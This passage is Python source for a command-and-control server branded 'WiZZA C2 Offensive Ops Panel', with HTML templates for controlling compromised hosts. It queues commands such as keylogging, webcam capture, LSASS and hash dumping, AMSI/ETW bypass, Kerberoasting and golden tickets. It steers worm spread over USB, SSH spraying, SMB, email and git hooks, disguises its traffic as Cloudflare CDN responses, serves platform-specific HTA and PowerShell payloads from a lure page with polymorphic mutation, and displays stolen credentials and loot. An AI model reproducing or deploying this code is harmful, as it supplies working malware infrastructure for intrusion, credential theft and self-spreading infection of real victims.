.rh{{padding:7px 12px;background:var(--bg3);display:flex;gap:10px;align-items:center;font-size:11px}}
.rh .ra{{color:var(--acc);font-weight:700}}.rh .rc{{color:var(--yel)}}.rh .rt{{color:var(--sub);margin-left:auto}}
.rh .rdel{{color:var(--red);text-decoration:none;margin-left:8px;font-size:13px}}
.rbody{{padding:10px 12px;font-family:monospace;font-size:11.5px;white-space:pre-wrap;max-height:260px;overflow-y:auto;color:#b0c8e0}}
.rimg{{padding:8px 12px}}.rimg img{{max-width:100%;max-height:280px;border:1px solid var(--brd);border-radius:3px}}
.ci{{background:var(--bg2);border:1px solid var(--brd);border-left:3px solid var(--red);border-radius:4px;padding:9px 12px;margin-bottom:7px;font-family:monospace;font-size:12px}}
.ci .cv{{color:var(--red);font-weight:700}}
.lg{{display:flex;flex-wrap:wrap;gap:10px}}
.lc{{background:var(--bg2);border:1px solid var(--brd);border-radius:5px;padding:8px;width:220px}}
.lc img{{width:100%;border-radius:3px;margin-bottom:6px;border:1px solid var(--brd)}}
.lc .lf{{font-size:11px;color:var(--yel);word-break:break-all;margin-bottom:3px}}
.lc .ls{{font-size:10px;color:var(--sub);margin-bottom:4px}}
.wc{{background:var(--bg2);border:1px solid var(--brd);border-left:3px solid var(--pink);border-radius:5px;padding:10px 14px;margin-bottom:8px}}
.wc .wi{{color:var(--pink);font-weight:700;font-size:13px}}.wc .wn{{color:var(--sub);font-size:11px;margin:3px 0}}
.wc .wl{{font-family:monospace;font-size:10.5px;color:#7ab;margin-top:6px;max-height:80px;overflow-y:auto;background:var(--bg);padding:5px;border-radius:3px}}
.tbar{{display:flex;gap:8px;margin-bottom:12px;align-items:center;flex-wrap:wrap}}
a{{color:var(--acc);text-decoration:none}}
</style></head><body>
<div id="sidebar">
<div id="logo">&#x26A1; WiZZA C2<span>Offensive Ops Panel</span></div>
<a class="nav active" onclick="T('agents')" id="n-agents">&#x1F4BB; Agents <span class="badge g" id="b-ac">{ac}</span></a>
<a class="nav" onclick="T('cmd')" id="n-cmd">&#x25BA; Command</a>
<a class="nav" onclick="T('out')" id="n-out">&#x1F4E1; Output</a>
<a class="nav" onclick="T('creds')" id="n-creds">&#x1F511; Credentials <span class="badge" id="b-cc">{cc}</span></a>
<a class="nav" onclick="T('loot')" id="n-loot">&#x1F4E6; Loot <span class="badge" id="b-lc">{lc}</span></a>
<a class="nav" onclick="T('wf')" id="n-wf">&#x1F9EC; Worm Family <span class="badge p" id="b-wc">{wc}</span></a>
<a class="nav" onclick="T('wctl')" id="n-wctl">&#x2699; Worm Control</a>
<a class="nav" href="/netmap" target="_blank">&#x1F5FA; Net Map</a>
<a class="nav" href="/report" target="_blank">&#x1F4CB; Report</a>
<a class="nav" href="/exploit" target="_blank">&#x1F4A5; Exploits</a>
<div id="sbar"><div>Online: <b>{ac}</b></div><div>Worms: <b>{wc}</b></div><div>Creds: <b>{cc}</b></div><div>Loot: <b>{lc}</b></div></div>
</div>
<div id="main">
<div id="topbar"><span id="ttl">Agents</span><span>{ts} &nbsp;|&nbsp; <a href="/mobile">&#x1F4F1; Mobile</a> &nbsp;|&nbsp; <a href="/panel">&#x21BA; refresh</a></span></div>
<div id="content">
<div class="pane active" id="p-agents">
<table id="agt">
<tr><th>ID</th><th>IP</th><th>OS / Device</th><th>Host / User</th><th>Priv</th><th>Type</th><th>Last Seen</th><th>Actions</th></tr>
{ar}
</table>
</div>
<div class="pane" id="p-cmd">
<div class="box"><label>Selected Agent</label><div class="row"><select id="csel" onchange="SA(this.value)">{ao}</select></div></div>
<div class="box"><label>Send Command</label>
<form method="POST" action="/cmd" onsubmit="document.getElementById('cah').value=_aid">
<input type="hidden" name="aid" id="cah" value="{fa}">
<div class="row"><input type="text" name="cmd" placeholder="RECON | SCREENSHOT | shell command...">
<button class="btn bp" type="submit">&#x25BA; Send</button>
<button class="btn ba" type="submit" onclick="document.getElementById('cah').value='__ALL__'">&#x2605; ALL</button>
</div></form></div>
<div class="qa-sec"><div class="qa-lbl">Reconnaissance</div><div class="qa-row">
<a class="qa" onclick="Q('RECON')">RECON</a><a class="qa" onclick="Q('SYSINFO')">SYSINFO</a>
<a class="qa" onclick="Q('NETWORK')">NETWORK</a><a class="qa" onclick="Q('DRIVES')">DRIVES</a>
<a class="qa" onclick="Q('whoami')">whoami</a><a class="qa" onclick="Q('id')">id</a><a class="qa" onclick="Q('hostname')">hostname</a>
</div></div>
<div class="qa-sec"><div class="qa-lbl">Capture</div><div class="qa-row">
<a class="qa g" onclick="Q('SCREENSHOT')">SCREENSHOT</a><a class="qa g" onclick="Q('WEBCAM')">WEBCAM</a>
<a class="qa g" onclick="Q('CLIPBOARD')">CLIPBOARD</a><a class="qa g" onclick="Q('KEYLOG_START')">KEYLOG START</a>
<a class="qa g" onclick="Q('KEYLOG_DUMP')">KEYLOG DUMP</a>
</div></div>
<div class="qa-sec"><div class="qa-lbl">Post-Exploitation</div><div class="qa-row">
<a class="qa y" onclick="Q('PERSIST')">PERSIST</a><a class="qa y" onclick="Q('PRIVESC')">PRIVESC</a>
<a class="qa y" onclick="Q('HASHDUMP')">HASHDUMP</a><a class="qa y" onclick="Q('SSHKEYS')">SSHKEYS</a>
<a class="qa y" onclick="Q('BROWSERS')">BROWSERS</a><a class="qa y" onclick="Q('EXFIL')">EXFIL</a>
<a class="qa y" onclick="Q('SSH_TARGETS')">SSH_TARGETS</a><a class="qa y" onclick="Q('NET_SCAN')">NET_SCAN</a>
<a class="qa y" onclick="Q('SSH_SPRAY')">SSH_SPRAY</a><a class="qa y" onclick="Q('SMB_SCAN')">SMB_SCAN</a>
<a class="qa y" onclick="Q('NET_MOUNTS')">NET_MOUNTS</a><a class="qa y" onclick="Q('GIT_POISON')">GIT_POISON</a>
<a class="qa y" onclick="Q('EMAIL_SPREAD')">EMAIL_SPREAD</a><a class="qa y" onclick="Q('DOCKER_ESCAPE')">DOCKER_ESCAPE</a>
<a class="qa y" onclick="Q('SPREAD')">USB_SPREAD</a>
</div></div>
<div class="qa-sec"><div class="qa-lbl">EDR / Evasion</div><div class="qa-row">
<a class="qa p" onclick="Q('AMSI_BYPASS')">AMSI</a>
<a class="qa p" onclick="Q('ETW_BYPASS')">ETW</a>
<a class="qa p" onclick="Q('NTDLL_UNHOOK')">UNHOOK</a>
<a class="qa p" onclick="Q('UAC_BYPASS')">UAC</a>
<a class="qa p" onclick="Q('IMPERSONATE_SYSTEM')">IMPERSONATE</a>
<a class="qa p" onclick="Q('LSASS_DUMP')">LSASS</a>
<a class="qa p" onclick="Q('WMI_PERSIST')">WMI PERSIST</a>
<a class="qa p" onclick="Q('COM_HIJACK')">COM HIJACK</a>
</div></div>
<div class="qa-sec"><div class="qa-lbl">Active Directory</div><div class="qa-row">
<a class="qa y" onclick="Q('AD_ENUM')">AD ENUM</a>
<a class="qa y" onclick="Q('KERBEROAST')">KERBEROAST</a>
<a class="qa y" onclick="Q('AS_REP_ROAST')">AS-REP ROAST</a>
<a class="qa y" onclick="Q('DCE_ENUM')">DCE ENUM</a>
<a class="qa y" onclick="Q('BLOODHOUND')">BLOODHOUND</a>
<a class="qa y" onclick="Q('PASS_THE_HASH')">PTH</a>
<a class="qa y" onclick="Q('PASS_THE_TICKET')">PTT</a>
<a class="qa y" onclick="Q('GOLDEN_TICKET')">GOLDEN TICKET</a>
</div></div>
<div class="qa-sec"><div class="qa-lbl">Shell / Tunnel</div><div class="qa-row">
<a class="qa g" onclick="window.open('/pty/'+_aid+'/term','_blank','width=1000,height=600')">&#x1F5A5; PTY SHELL</a>
<a class="qa g" onclick="Q('PTY_START')">PTY START</a>
<a class="qa" onclick="Q('PROXY_START')">PROXY START</a>
<a class="qa" onclick="Q('PROXY_STOP')">PROXY STOP</a>
<a class="qa" onclick="Q('PORT_FWD')">PORT FWD</a>
</div></div>
<div class="qa-sec"><div class="qa-lbl">Danger</div><div class="qa-row">
<a class="qa r" onclick="Q('CLEAN')">CLEAN LOGS</a>
<a class="qa r" onclick="if(confirm('DEINFECT this agent? Removes all persistence + self-deletes.'))Q('DEINFECT')">DEINFECT</a>
<a class="qa r" onclick="if(confirm('Selfdestruct?'))Q('SELFDESTRUCT')">SELFDESTRUCT</a>
</div></div>
<div class="qa-sec"><div class="qa-lbl">Broadcast</div><div class="qa-row">
<a class="qa r" href="/deinfect/all" onclick="return confirm('DEINFECT ALL agents? This removes all persistence on every registered host.')">DEINFECT ALL</a>
<a class="qa r" href="/deinfect/worms" onclick="return confirm('DEINFECT all worm agents?')">DEINFECT WORMS</a>
<a class="qa" href="/infection/ledger" target="_blank">INFECTION LEDGER</a>
</div></div>
</div>
<div class="pane" id="p-out">
<div class="tbar"><a class="qa r" href="/agent/clear_output?aid=__ALL__" onclick="return confirm('Clear all output?')">&#x1F5D1; Clear All Output</a></div>
{ou}
</div>
<div class="pane" id="p-creds">
<div class="tbar"><a class="qa r" href="/creds/clear" onclick="return confirm('Delete all credentials?')">&#x1F5D1; Clear All Credentials</a></div>
{cr}
</div>
<div class="pane" id="p-loot">
<div class="tbar"><a class="qa r" href="/loot/clear" onclick="return confirm('Delete ALL loot files?')">&#x1F5D1; Clear All Loot</a></div>
<div class="lg">{lg}</div>
</div>
<div class="pane" id="p-wf">{wf}</div>
<div class="pane" id="p-wctl">
<div class="box"><label>Target Worm</label><div class="row"><select id="wsel" onchange="SW(this.value)">{worm_opts}</select></div></div>
<div class="box"><label>Send Worm Command</label>
<form method="POST" action="/cmd" onsubmit="document.getElementById('wah').value=_waid">
<input type="hidden" name="aid" id="wah" value="{fw}">
<div class="row"><input type="text" name="cmd" placeholder="WORM_STATUS | WORM_PAUSE | WORM_SPREAD_NOW...">
<button class="btn bp" type="submit">&#x25BA; Send</button>
<button class="btn ba" type="submit" onclick="document.getElementById('wah').value='__ALL_WORMS__'">&#x1F9EC; ALL WORMS</button>
</div></form></div>
<div class="qa-sec"><div class="qa-lbl">Flow Control</div><div class="qa-row">
<a class="qa g" onclick="W('WORM_STATUS')">STATUS</a><a class="qa" onclick="W('WORM_PAUSE')">PAUSE</a>
<a class="qa g" onclick="W('WORM_RESUME')">RESUME</a><a class="qa r" onclick="W('WORM_STOP_SPREAD')">STOP SPREAD</a>
<a class="qa g" onclick="W('WORM_START_SPREAD')">START SPREAD</a><a class="qa y" onclick="W('WORM_SPREAD_NOW')">SPREAD NOW</a>
<a class="qa" onclick="W('WORM_LIST_TARGETS')">LIST TARGETS</a><a class="qa" onclick="W('WORM_CLEAR_LOG')">CLEAR LOG</a>
<a class="qa" onclick="W('WORM_CLEAR_SKIP')">CLEAR SKIP</a>
</div></div>
<div class="qa-sec"><div class="qa-lbl">Vector Switches</div>
<table style="width:auto">
<tr><th>Vector</th><th>ON</th><th>OFF</th></tr>
<tr><td>USB</td><td><a class="qa g" onclick="W('WORM_USB_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_USB_OFF')">OFF</a></td></tr>
<tr><td>SSH Keys</td><td><a class="qa g" onclick="W('WORM_SSH_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_SSH_OFF')">OFF</a></td></tr>
<tr><td>SSH Spray</td><td><a class="qa g" onclick="W('WORM_SPRAY_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_SPRAY_OFF')">OFF</a></td></tr>
<tr><td>SMB</td><td><a class="qa g" onclick="W('WORM_SMB_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_SMB_OFF')">OFF</a></td></tr>
<tr><td>Email</td><td><a class="qa g" onclick="W('WORM_EMAIL_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_EMAIL_OFF')">OFF</a></td></tr>
<tr><td>Net Mounts</td><td><a class="qa g" onclick="W('WORM_NETMOUNT_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_NETMOUNT_OFF')">OFF</a></td></tr>
<tr><td>Docker</td><td><a class="qa g" onclick="W('WORM_DOCKER_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_DOCKER_OFF')">OFF</a></td></tr>
<tr><td>Git Hooks</td><td><a class="qa g" onclick="W('WORM_GIT_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_GIT_OFF')">OFF</a></td></tr>
</table></div>
</div>
</div></div>
<script>
var _aid=sessionStorage.getItem('c2aid')||'{fa}';
var _waid=sessionStorage.getItem('c2waid')||'{fw}';
var _tab=sessionStorage.getItem('c2tab')||'agents';
var _tabs={{'agents':'Agents','cmd':'Command','out':'Output','creds':'Credentials','loot':'Loot Gallery','wf':'Worm Family','wctl':'Worm Control'}};
function T(t){{
  document.querySelectorAll('.pane').forEach(function(p){{p.classList.remove('active')}});
  document.querySelectorAll('.nav').forEach(function(n){{n.classList.remove('active')}});
  var p=document.getElementById('p-'+t),n=document.getElementById('n-'+t);
  if(p)p.classList.add('active');if(n)n.classList.add('active');
  document.getElementById('ttl').textContent=_tabs[t]||t;
  sessionStorage.setItem('c2tab',t);
}}
function SA(v){{_aid=v;sessionStorage.setItem('c2aid',v);var h=document.getElementById('cah');if(h)h.value=v;}}
function SW(v){{_waid=v;sessionStorage.setItem('c2waid',v);var h=document.getElementById('wah');if(h)h.value=v;}}
function Q(c){{location='/q?aid='+encodeURIComponent(_aid)+'&cmd='+encodeURIComponent(c);}}
function W(c){{location='/q?aid='+encodeURIComponent(_waid)+'&cmd='+encodeURIComponent(c);}}
(function(){{
  T(_tab);
  var cs=document.getElementById('csel');
  if(cs)for(var i=0;i<cs.options.length;i++)if(cs.options[i].value==_aid){{cs.selectedIndex=i;break;}}
  var h=document.getElementById('cah');if(h)h.value=_aid;
  var ws=document.getElementById('wsel');
  if(ws)for(var i=0;i<ws.options.length;i++)if(ws.options[i].value==_waid){{ws.selectedIndex=i;break;}}
  var wh=document.getElementById('wah');if(wh)wh.value=_waid;
  document.querySelectorAll('#agt tr[data-aid]').forEach(function(r){{
    if(r.getAttribute('data-aid')==_aid)r.classList.add('sel');
    r.style.cursor='pointer';
    r.onclick=function(){{
      SA(this.getAttribute('data-aid'));
      document.querySelectorAll('#agt tr').forEach(function(x){{x.classList.remove('sel')}});
      this.classList.add('sel');T('cmd');
    }};
  }});
}})();
setTimeout(function(){{location.reload()}},5000);
</script>
</body></html>"""

HTML_LOOT="""<!DOCTYPE html><html><head><title>Loot</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:monospace;background:#080808;color:#0f0;padding:14px;font-size:13px}}
h1{{color:#0ff;margin-bottom:12px;font-size:15px}}
.bar{{display:flex;gap:8px;margin-bottom:12px}}
.bar a{{background:#111;border:1px solid #222;color:#0ff;padding:4px 12px;border-radius:3px;font-size:12px}}
.grid{{display:flex;flex-wrap:wrap;gap:10px}}
.item{{background:#0a0a0a;border:1px solid #1a1a1a;padding:8px;border-radius:4px;width:320px}}
.item img{{max-width:100%;border:1px solid #1a1a1a;display:block;margin-bottom:6px}}
.item .fn{{color:#ff0;font-size:11px;word-break:break-all}}
.item .sz{{color:#555;font-size:10px}}
.item a{{color:#0ff;font-size:11px}}
</style></head><body>
<h1>&#x1F4E6; LOOT ({cnt} files)</h1>
<div class="bar"><a href="/panel">&#x2190; Panel</a></div>
<div class="grid">{items}</div></body></html>"""

HTML_CREDS="""<!DOCTYPE html><html><head><title>Credentials</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:monospace;background:#080808;color:#0f0;padding:14px;font-size:13px}}
h1{{color:#0ff;margin-bottom:12px;font-size:15px}}
.bar{{display:flex;gap:8px;margin-bottom:12px}}
.bar a{{background:#111;border:1px solid #222;color:#0ff;padding:4px 12px;border-radius:3px;font-size:12px}}
.cred{{background:#150000;border-left:3px solid #a00;padding:8px 12px;margin-bottom:6px;font-size:13px}}
.cv{{color:#f66;font-weight:bold}}.tag{{font-size:11px;background:#1a1a1a;padding:2px 6px;border-radius:2px;color:#666;margin-left:6px}}
</style></head><body>
<h1>&#x1F511; CREDENTIALS ({cnt})</h1>
<div class="bar"><a href="/panel">&#x2190; Panel</a></div>
{items}</body></html>"""

class H(BaseHTTPRequestHandler):
    def log_message(self,*a): pass

    def _cdn_headers(self):
        """Inject Cloudflare CDN-mimicking headers so traffic looks like a CDN response."""
        ray_id = ''.join(random.choices('0123456789abcdef', k=16))
        self.send_header("Server", "cloudflare")
        self.send_header("CF-RAY", f"{ray_id}-AMS")
        self.send_header("CF-Cache-Status", random.choice(["HIT","MISS","EXPIRED"]))
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Vary", "Accept-Encoding")
        self.send_header("Cache-Control", "public, max-age=14400")
        self.send_header("Age", str(random.randint(0, 3600)))

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type,X-Requested-With")
        self._cdn_headers()

    def do_OPTIONS(self): self.send_response(204);self._cors();self.end_headers()

    def do_GET(self):
        p=urlparse(self.path); qs=parse_qs(p.query)
        path=p.path

        if path=="/js-agent.js": self._send(JS_AGENT,"application/javascript"); return
        if path.startswith("/sw.js"):
            aid=qs.get("aid",["sw"])[0]; host=self.headers.get("Host","localhost")
            sw=SW_JS.replace("__C2URL__",f"https://{host}").replace("__AID__",aid)
            self._send(sw,"application/javascript"); return
        if path=="/manifest.json": self._send(MANIFEST,"application/manifest+json"); return
        if path=="/icon.png":
            import base64; self._send(base64.b64decode(
                "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="),
                "image/png",raw=True); return

        if path=="/agent/register":
            aid=qs.get("id",[""])[0] or f"h{int(time.time())}"
            with _lock:
                agents[aid]={"ip":self.client_address[0],
                    "os":qs.get("os",["?"])[0].replace("+"," "),
                    "hostname":qs.get("hostname",["?"])[0],
                    "user":qs.get("user",["?"])[0],
                    "priv":qs.get("priv",["?"])[0],
                    "type":qs.get("type",["http"])[0],
                    "last_seen":ts(),"status":"ONLINE",
                    "log":f"{LOG_DIR}/agent_{aid}.txt"}
            log(f"[AGENT] {aid} | {agents[aid]['type']} | {agents[aid]['priv']} | {agents[aid]['os'][:60]}")
            self._send("OK"); return

        if path=="/agent/poll":
            aid=qs.get("id",[""])[0]
            with _lock:
                if aid in agents:
                    agents[aid]["last_seen"]=ts(); agents[aid]["status"]="ONLINE"
                    cmd=agent_cmds[aid].pop(0) if agent_cmds[aid] else "PING"
                    self._send(cmd)
                else: self._send("REGISTER")
            return

        # ── Clean lure endpoint — URL looks like /docs, /update, etc. ──
        if path == LURE_PATH:
            ua = self.headers.get("User-Agent","").lower()
            # Pick payload by platform
            if "windows" in ua:
                # Prefer HTA (runs without PowerShell consent prompt)
                hta_files = [f for f in os.listdir(PAYLOAD_DIR) if f.endswith(".hta")]
                fname = hta_files[0] if hta_files else "worm_agent.ps1"
            elif "mac" in ua or "darwin" in ua:
                fname = "agent_http.py"
            else:
                fname = "agent_http.py"
            fpath = os.path.join(PAYLOAD_DIR, fname)
            if os.path.exists(fpath):
                with open(fpath,"rb") as f: data=f.read()
                ct = "application/hta" if fname.endswith(".hta") else "application/octet-stream"
                self.send_response(200)
                self.send_header("Content-Type", ct)
                self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
                self.send_header("Content-Length", len(data))
                self._cors(); self.end_headers()
                self.wfile.write(data)
            else:
                # Fallback: serve a redirect page that auto-downloads
                html=(f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
                      f"<title>{LURE_TITLE}</title>"
                      f"<style>body{{font-family:Arial,sans-serif;text-align:center;padding:60px;background:#f9f9f9}}"
                      f"h2{{color:#1a73e8}}</style></head><body>"
                      f"<h2>&#128274; {LURE_TITLE}</h2>"
                      f"<p>Preparing your download...</p>"
                      f"<p style='color:#888;font-size:13px'>If download does not start automatically, "
                      f"<a href='/download/worm_agent.ps1'>click here</a>.</p>"
                      f"<script>setTimeout(function(){{window.location='/download/worm_agent.ps1'}},1500)</script>"
                      f"</body></html>")
                self._html(html)
            return

        if path.startswith("/download/"):
            fname=os.path.basename(path[10:]); fpath=os.path.join(PAYLOAD_DIR,fname)
            if os.path.exists(fpath):
                # Per-request polymorphic mutation for PS1 and Python payloads
                data = _poly_mutate(fpath)
                # CDN-disguised content type: serve as application/javascript (looks like a CDN script)
                if fname.endswith((".ps1",".py",".sh",".bat",".vbs")):
                    ct = "application/javascript"
                    cdn_name = fname.replace(".ps1","_bundle.js").replace(".py","_bundle.js").replace(".sh","_bundle.js")
                else:
                    ct, _ = mimetypes.guess_type(fname)
                    ct = ct or "application/octet-stream"
                    cdn_name = fname
                self.send_response(200); self.send_header("Content-Type",ct)
                self.send_header("Content-Disposition",f'attachment; filename="{cdn_name}"')
                self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
                self.wfile.write(data)
            else: self.send_response(404); self.end_headers()
            return

        # ── CDN-disguised agent routes (/cdn-cgi/apps/*) ──────────────────────
        # These mirror /agent/* but look like Cloudflare CDN requests
        if path.startswith("/cdn-cgi/apps/"):
            qs2 = parse_qs(urlparse(self.path).query)
            aid = qs2.get("v",[""])[0] or qs2.get("id",[""])[0]

            if "init" in path:
                # Maps to /agent/register
                os_v   = unquote_plus(qs2.get("os",[""])[0])
                hn     = unquote_plus(qs2.get("hostname",[""])[0])
                un     = unquote_plus(qs2.get("user",[""])[0])
                atype  = qs2.get("type",["worm"])[0]
                ts     = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                spread_raw  = unquote_plus(qs2.get("spread",[""])[0])
                persist_raw = unquote_plus(qs2.get("persist",[""])[0])
                spread_list  = [h for h in spread_raw.split(",")  if h]
                persist_list = [m for m in persist_raw.split(",") if m]
                with threading.Lock():
                    existing = agents.get(aid, {})
                    agents[aid] = {
                        "id": aid, "os": os_v, "hostname": hn, "user": un,
                        "type": atype, "first_seen": existing.get("first_seen", ts),
                        "last_seen": ts, "alive": True,
                        "persist_methods": persist_list,
                        "spread_log": spread_list,
                    }
                _log(f"[CDN-REG] {aid} os={os_v} host={hn} user={un} persist={persist_list} spread={spread_list[:5]}")
                resp = _comm_enc("OK", aid) if aid else "OK"
                self._send(resp); return

            if "sync" in path:
                # Maps to /agent/poll
                agents.setdefault(aid,{})["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                agents.setdefault(aid,{})["alive"] = True
                cmd = agent_cmds.pop(aid, "") or ""
                resp = _comm_enc(cmd, aid) if (aid and cmd) else (_comm_enc("PING", aid) if aid else "")
                self._send(resp); return

            self.send_response(404); self.end_headers(); return

        if path.startswith("/loot/dl/"):
            fname=os.path.basename(path[9:]); fpath=os.path.join(LOOT_DIR,fname)
            if os.path.exists(fpath):
                ct,_=mimetypes.guess_type(fpath); ct=ct or "application/octet-stream"
                with open(fpath,"rb") as f: data=f.read()
                self.send_response(200); self.send_header("Content-Type",ct)
                self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
                self.wfile.write(data)
            else: self.send_response(404); self.end_headers()
            return

        if path=="/loot":
            files=sorted(os.listdir(LOOT_DIR),reverse=True) if os.path.isdir(LOOT_DIR) else []
            items=""
            for f in files[:50]:
                fp=os.path.join(LOOT_DIR,f)
                sz=os.path.getsize(fp); ext=f.lower()
                if ext.endswith((".png",".jpg",".jpeg")):
                    items+=(f"<div class='item'><img src='/loot/dl/{f}' loading='lazy'>"
                            f"<div class='fn'>{f}</div><div class='sz'>{sz//1024}KB</div>"
                            f"<a href='/loot/dl/{f}' download>&#x2B07; download</a></div>")
                else:
                    items+=(f"<div class='item'><div class='fn'>{f}</div>"
                            f"<div class='sz'>{sz//1024}KB</div>"
                            f"<a href='/loot/dl/{f}' download>&#x2B07; download</a></div>")
            if not items: items="<p style='color:#444'>No loot yet.</p>"
            self._html(HTML_LOOT.format(cnt=len(files),items=items)); return

        if path=="/creds":
            lines=[]
            try: lines=open(CREDS_FILE).readlines()
            except: pass
            items=""
            for line in reversed(lines[-100:]):
                parts={}
                [parts.__setitem__(*(tok.split("=",1))) for tok in line.strip().split("  ") if "=" in tok]
                items+=(f"<div class='cred'>user=<span class='cv'>{parts.get('user','?').strip(chr(39))}</span>  "
                        f"pass=<span class='cv'>{parts.get('pass','?').strip(chr(39))}</span>  "
                        f"<span class='tag'>{parts.get('src','?')}</span></div>")
            if not items: items="<p style='color:#444'>No credentials yet.</p>"
            self._html(HTML_CREDS.format(cnt=len(lines),items=items)); return

        if path in("/","/banner","/portal","/login"): self._html(BANNER); return

        if path=="/q":
            aid=qs.get("aid",[""])[0]; cmd=unquote_plus(qs.get("cmd",[""])[0])
            if aid and cmd:
                if aid=="__ALL__":
                    with _lock:
                        for a in agents: agent_cmds[a].append(cmd)
                    log(f"[BROADCAST] {cmd}")
                elif aid=="__ALL_WORMS__":
                    with _lock:
                        for a in agents:
                            if a.startswith("w"): agent_cmds[a].append(cmd)
                    log(f"[WORM-BROADCAST] {cmd}")
                else:
                    agent_cmds[aid].append(cmd); log(f"[CMD] {aid}: {cmd}")
            self._redir("/panel"); return

        if path=="/logs":
            aid=qs.get("aid",[""])[0]
            if aid in agents:
                try: c=open(agents[aid]["log"]).read()
                except: c="(empty)"
                self._html(f"<pre style='color:#0f0;background:#000;padding:20px;white-space:pre-wrap;font-size:12px;max-width:1200px'>{c}</pre>")
            else:
                self._redir("/panel")
            return

        # ── Deinfect endpoints ─────────────────────────────────────────────────
        if path == "/deinfect/all":
            with _lock:
                targets = list(agents.keys())
                for a in targets: agent_cmds[a].append("DEINFECT")
            log(f"[DEINFECT-ALL] queued DEINFECT for {len(targets)} agents")
            self._json({"queued": targets, "count": len(targets)}); return

        if path == "/deinfect/worms":
            with _lock:
                targets = [a for a in agents if agents[a].get("type","").startswith("worm")]
                for a in targets: agent_cmds[a].append("DEINFECT")
            log(f"[DEINFECT-WORMS] queued DEINFECT for {len(targets)} worm agents")
            self._json({"queued": targets, "count": len(targets)}); return

        if path.startswith("/deinfect/"):
            aid = path.split("/")[-1]
            if aid in agents:
                agent_cmds[aid].append("DEINFECT")
                log(f"[DEINFECT] queued for {aid}")
                self._json({"queued": aid, "persist": agents[aid].get("persist_methods",[]),
                            "spread": agents[aid].get("spread_log",[])}); return
            self._json({"error": "agent not found"}, 404); return

        if path == "/infection/ledger":
            ledger = {}
            with _lock:
                for aid, a in agents.items():
                    ledger[aid] = {
                        "hostname": a.get("hostname","?"),
                        "user": a.get("user","?"),
                        "os": a.get("os","?"),
                        "persist_methods": a.get("persist_methods",[]),
                        "spread_log": a.get("spread_log",[]),
                        "first_seen": a.get("first_seen","?"),
                        "last_seen": a.get("last_seen","?"),
                        "alive": a.get("alive", False),
                    }
            self._json(ledger); return

        # ── Network map (visual) ───────────────────────────────────────────────
        if path == "/netmap":
            nm = os.path.join(_THIS_DIR, "static", "netmap.html")
            if os.path.exists(nm):
                self._html(open(nm).read())
            else:
                self._html("<h2>netmap.html not found</h2>")
            return

        # ── Report generation ──────────────────────────────────────────────────
        if path.startswith("/report"):
            fmt = qs.get("fmt",["html"])[0]
            try:
                _sys.path.insert(0, _MOD_DIR)
                from report_gen import generate_report
                html_out = generate_report(
                    agents, dict(agent_resps),
                    loot_dir=LOOT_DIR, creds_file=CREDS_FILE,
                    fmt=fmt,
                    title="WiZZA Pentest Report",
                    engagement=qs.get("eng",[""])[0],
                    operator=qs.get("op",[""])[0],
                )
                if fmt == "json":
                    self._json(json.loads(html_out)); return
                if fmt == "csv":
                    self._send(html_out, "text/csv"); return
                self._html(html_out)
            except Exception as e:
                self._html(f"<h2>Report error: {e}</h2>")
            return

        # ── Agents JSON (network map) ──────────────────────────────────────────
        if path == "/agents/json":
            with _lock:
                snap = {aid: {k:v for k,v in a.items() if k != "log"}
                        for aid, a in agents.items()}
            self._json(snap); return

        # ── C2 Profiles ────────────────────────────────────────────────────────
        if path == "/profiles":
            if _PROFILES_OK:
                self._json({"profiles": _list_profiles(),
                            "active":   _get_profile().get("user_agent","?")[:60]})
            else:
                self._json({"error": "c2_profiles module not available"})
            return

        if path.startswith("/profiles/set/"):
            pname = path.split("/")[-1]
            if _PROFILES_OK:
                self._json({"result": _set_profile(pname)})
            else:
                self._json({"error": "c2_profiles module not available"})
            return

        # ── LLMNR/NBT-NS poisoner endpoints ───────────────────────────────────
        if path == "/llmnr/start":
            if _LLMNR_OK:
                attacker_ip = qs.get("ip",[""])[0]
                result = _llmnr_start(attacker_ip) if attacker_ip else _llmnr_start()
                log(f"[LLMNR] started: {result[:60]}")
                self._json({"result": result})
            else:
                self._json({"error": "llmnr_poison module not available"})
            return

        if path == "/llmnr/stop":
            if _LLMNR_OK:
                result = _llmnr_stop()
                log(f"[LLMNR] {result}")
                self._json({"result": result})
            else:
                self._json({"error": "llmnr_poison module not available"})
            return

        if path == "/llmnr/hashes":
            if _LLMNR_OK:
                self._send(_llmnr_hashes(), "text/plain")
            else:
                self._send("llmnr_poison module not available")
            return

        # ── PTY shell ─────────────────────────────────────────────────────────
        if path.startswith("/pty/"):
            parts = path.split("/")  # ['','pty','aid',...]
            pty_aid = parts[2] if len(parts) > 2 else qs.get("aid",[""])[0]
            sub = parts[3] if len(parts) > 3 else ""

            if not _PTY_OK:
                self._html("<h2>pty_handler module not available</h2>"); return

            if not sub or sub == "term":
                self._html(_pty.pty_html(pty_aid)); return

            if sub == "stream":
                # SSE endpoint — streams PTY output to browser/xterm.js
                self.send_response(200)
                self.send_header("Content-Type", "text/event-stream")
                self.send_header("Cache-Control", "no-cache")
                self.send_header("Connection", "keep-alive")
                self._cors(); self.end_headers()
                try:
                    for chunk in _pty.stream_output(pty_aid):
                        data = chunk.encode() if isinstance(chunk, str) else chunk
